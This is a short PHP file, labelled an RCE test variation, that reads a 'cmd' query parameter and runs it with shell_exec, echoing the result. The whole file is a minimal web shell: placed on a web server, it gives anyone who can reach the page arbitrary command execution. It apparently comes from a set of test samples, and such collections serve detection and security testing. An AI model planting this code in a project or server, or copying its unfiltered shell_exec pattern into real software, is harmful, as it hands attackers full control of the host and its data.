<?php
// RCE test variation #193
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>